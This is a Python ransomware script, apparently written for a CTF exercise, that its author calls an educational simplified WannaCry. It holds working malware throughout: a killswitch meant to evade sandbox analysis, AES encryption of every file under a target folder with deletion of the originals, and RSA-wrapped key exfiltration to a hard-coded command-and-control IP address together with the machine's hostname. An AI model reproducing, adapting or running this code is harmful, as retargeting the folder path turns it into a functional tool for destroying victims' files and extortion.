# This is a custom made malware developped for educationnal
# The idea is that it's a simplified version of Wannacry in Python (cause it's the language I know the most)
# It uses somme functionnalities of Wannacry and other ransomwares like encrypting files in AES, then RAS with a C2, Having a killswitch to prevent analysis, ...
# Author : ch4rybd3@protonmail.com

import requests
import sys
import random
import string
import shutil
import socket
import datetime
import os
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA


# The killswitch function
def killswitch():
    url = ''.join(random.choices(string.ascii_letters+string.digits, k=40))+ ".com"
    try: # If the random URL is reachable, it means that the script is probably running in a sandbox and we should stop execution
        request_random=requests.get(url)
        print(request_random.status_code)
        if request_random.status_code ==200:
            return True 
    except requests.exceptions.RequestException as e: # The script should return an error by default
        pass 
    try: # If the Google URL is reachable, it means that the script is probably running in a legitimate env so it should run
        request_google=requests.get("https://www.google.com")
        print(request_google.status_code)
        if request_google.status_code ==200:
            return False
        else:
            return True
    except requests.exceptions.RequestException as e:
        return True

# The function to generate a random AES key which will be used to encrypt the files
def generate_aes_key():
    key = get_random_bytes(32)  # 32 octets = 256 bits
    print("Generated AES key:", key.hex())  # Print the key in hexadecimal format for better readability
    return key

# Function to encrypt a file using AES
def list_files_in_fake_env(fake_root):
    if not fake_root.exists(): # Check if the files exists
        print(f"Error: {fake_root} does not exist.")
        return None
    files = [] # List all interesting files in the fake env
    for foldername, subfolders, filenames in os.walk(fake_root):
        for filename in filenames:
            file_path = Path(foldername) / filename
            files.append(file_path)
    return files

# Function used to encrypt the files
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f: # Read the file in binary mode
        file_data = f.read()
    cipher = AES.new(key, AES.MODE_CBC) # Create the AES Cypher in CBC mode
    ct_bytes = cipher.encrypt(pad(file_data, AES.block_size))
    encrypted_file_path = file_path.with_suffix(file_path.suffix + '.shoubadidou') # Create a new name for the file
    with open(encrypted_file_path, 'wb') as f:
        f.write(cipher.iv)
        f.write(ct_bytes)
    os.remove(file_path) # Remove the original file after encryption
    # print(f"File {file_path} has been encrypted and saved as {encrypted_file_path}")

# Function that managed the files encryption
def encrypt_fake_env_files():
    fake_root = Path.home() / "Documents" / "CTF-FSA-002_Documents"  # fake env path
    if not fake_root.exists():
        print(f"Error: {fake_root} does not exist. Stopping.")
        return
    aes_key = generate_aes_key() # Generate the AES key
    print(aes_key)
    send_aes_key_to_c2(aes_key)  # Sending the key to the C2 server
    files_to_encrypt = list_files_in_fake_env(fake_root) # List all files in the fake env
    if not files_to_encrypt:
        print("No files to encrypt.")
        return
    for file_path in files_to_encrypt: # Encrypt each file found in the fake env
        encrypt_file(file_path, aes_key)

# Send the AES key to the C2 server
def send_aes_key_to_c2(key):
    public_key = load_rsa_public_key()
    encrypted_aes_key = encrypt_aes_key_with_rsa(key, public_key)
    c2_url = "http://35.180.193.162:8999"
    hostname = socket.gethostname()  # Get computer name
    timestamp = datetime.datetime.now().isoformat()  # Get current timestamp in ISO format
    payload = {
        "aes_key": encrypted_aes_key.hex(),  # RSA-encrypted AES key as hex string
        "hostname": hostname,
        "timestamp": timestamp
    }
    try:
        response = requests.post(c2_url, json=payload)
        print(f"[C2] AES key sent to C2. Status code: {response.status_code}")
    except Exception as e:
        print(f"[C2] Failed to send AES key to C2: {e}")

# Function to load the RSA public key
def load_rsa_public_key():
    public_key_pem = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnAB7GQ1uawa9iwN0KJjO
o4NLfe6eda7MBFb41FY1/siCx0rQ9UYMrmoAl3YHyxY2X1NbJDEkE5U96warIgk6
yukTwEsMC9vzsYTgbfIlXkHVBZiB+4XK6cFMo+syxWziqLclWlYRpqWaPiBZAKIu
HptXUUT60b5VBZM1cKk6d5E5ASkGBm30iANIhcBG6YjWfn/MdgP4HcHmUrG9NmCa
aosXiQxMMcFDBm8ASFSBAfER3jGmNiMYR0mVbBo6wBWAXXOLJiJiRaPPgH/wJ3S8
/2SwexNHKWwhZ1FPvZ2E+DtVcSUi1eKBCyl9E0mtq9IjMD1nm+y9f90Lsmrq8h63
fwIDAQAB
-----END PUBLIC KEY-----"""
    public_key = RSA.import_key(public_key_pem)
    return public_key

# Function to encrypt the AES key with RSA
def encrypt_aes_key_with_rsa(aes_key, public_key):
    cipher_rsa = PKCS1_OAEP.new(public_key)
    encrypted_aes_key = cipher_rsa.encrypt(aes_key)
    return encrypted_aes_key

# Main
if killswitch():
    print("No Go...")
    sys.exit()
else:
    print("Go!")
    encrypt_fake_env_files()